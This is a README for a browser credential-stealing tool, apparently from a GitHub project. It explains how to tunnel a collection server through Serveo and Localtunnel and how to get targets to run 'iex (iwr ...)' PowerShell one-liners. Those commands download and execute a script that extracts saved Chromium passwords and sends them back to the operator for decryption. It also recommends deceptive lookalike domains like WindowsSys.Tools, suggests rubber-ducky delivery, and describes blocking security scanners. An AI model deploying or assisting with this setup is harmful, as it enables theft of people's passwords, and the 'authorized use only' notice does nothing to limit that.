# Browser Credential Collector

A tool designed to securely collect and decrypt stored browser credentials from remote systems. This tool helps security professionals and system administrators assess password security and demonstrate how easily browser-stored credentials can be retrieved.

1. It connects to both Serveo and Localtunnel services, giving you two different public URLs to access your server from anywhere
2. Customizes a unique useragent per user request to ensure it isn't spammed
3. Decrypts the passwords locally
4. Every time you re-run the script it will get you new public URLs, but each one can be used many times until you stop the script from running.
   If you have a custom domain, consider something like WindowsSys.Tools - this way you can create a catch all subdomain and customize it per engagement.
```
iex (iwr WindowsSys.Tools)
iex (iwr System32.Windows.Sys.Tools)
```

<p align="center">
  <img src="https://github.com/pentestfunctions/chromium_passwords_local_collection/blob/main/images/sample.png">
</p>

## 🚨 Important Notice

This tool is intended for **AUTHORIZED USE ONLY**. Always obtain proper permissions before using on any system. Unauthorized use against systems you don't own or have explicit permission to test is illegal and unethical. Red team engagements and rubber duckies work awesome with this.

## 🔑 Features

- Securely collects stored browser credentials
- Automatically decrypts passwords using browser encryption keys
- Real-time monitoring dashboard
- Secure token-based authentication
- Protection against scanning and unauthorized access
- Dual public access via Serveo and Localtunnel (both optional)
- Custom subdomain support for Localtunnel
- Rate limiting to prevent abuse

## 📋 Requirements

- Python 3.6+
- OpenSSH client (for Serveo tunneling)
- Node.js and NPX (for Localtunnel functionality)
- PyCryptodome (optional, for better decryption support)

## 💻 Quick Start

1. **Clone the repository**
```bash
git clone https://github.com/pentestfunctions/chromium_passwords_local_collection.git
cd chromium_passwords_local_collection
```

2. **Install dependencies**
```bash
# For decryption support
pip install pycryptodome

# For Localtunnel support (if you don't already have Node.js)
# For Debian/Ubuntu:
curl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash -
sudo apt-get install -y nodejs

# For macOS:
brew install node

# For Windows:
# Download and install from https://nodejs.org/
```

3. **Run the server**
```bash
python3 credential_collector.py
```

4. **Run with custom options**
```bash
# Use a custom Localtunnel subdomain
python3 credential_collector.py --lt-subdomain your-subdomain-name

# Disable Serveo but keep Localtunnel
python3 credential_collector.py --no-serveo

# Disable Localtunnel but keep Serveo
python3 credential_collector.py --no-localtunnel

# Use a custom port
python3 credential_collector.py --port 8080
```

5. **Execute the PowerShell script on target system**
```powershell
# Using Serveo URL
iex (iwr https://your-serveo-url.serveo.net/script)

# Using Localtunnel URL
iex (iwr https://your-subdomain.loca.lt/script)
```

The available URLs will be displayed in the console dashboard when the server is running.

## 📚 How It Works

1. The server runs on your machine and sets up tunnels through Serveo and Localtunnel
2. When a target accesses the `/script` endpoint via either URL, they receive a customized PowerShell script with a unique token
3. The PowerShell script extracts stored browser credentials and securely sends them back to the server
4. The server decrypts and stores the credentials
5. All activity is monitored in real-time through the console dashboard

## 🔄 Tunneling Services

### Serveo
- No installation required (uses SSH)
- Provides a random subdomain at serveo.net
- More reliable for some environments

### Localtunnel
- Requires Node.js and NPX
- Supports custom subdomains (e.g., `--lt-subdomain your-name`)
- Sometimes offers better performance and connectivity options
- Uses loca.lt domain

## 🔒 Security Features

- One-time tokens for script authentication
- Rate limiting to prevent abuse
- Scanner detection to block common vulnerability scanners
- IP blocking for suspicious activity
- All credentials stored locally in JSON format

## 📊 Understanding the Dashboard

The dashboard shows:
- Server information (local, network, and public URLs for both tunneling services)
- Collection statistics (credentials collected, success rates)
- Recent events
- Tunnel status for both Serveo and Localtunnel
- Ready-to-use PowerShell commands for both tunnels
- List of collected credential files
- Blocked IPs

## ❓ Troubleshooting

**Error: "pycryptodome not found"**
- Install with: `pip install pycryptodome`

**Can't establish Serveo tunnel**
- Make sure SSH is installed and can connect to external services
- Try running with `--no-serveo` to use only Localtunnel

**Can't establish Localtunnel**
- Make sure Node.js and NPX are installed: `node --version` and `npx --version`
- Try running with `--no-localtunnel` to use only Serveo

**Custom subdomain not available**
- Localtunnel subdomains are on a first-come, first-served basis
- Try a different, more unique subdomain name

**No credentials collected**
- Verify the target system has Chrome/Chromium-based browsers installed
- Check that the PowerShell script is running with sufficient permissions
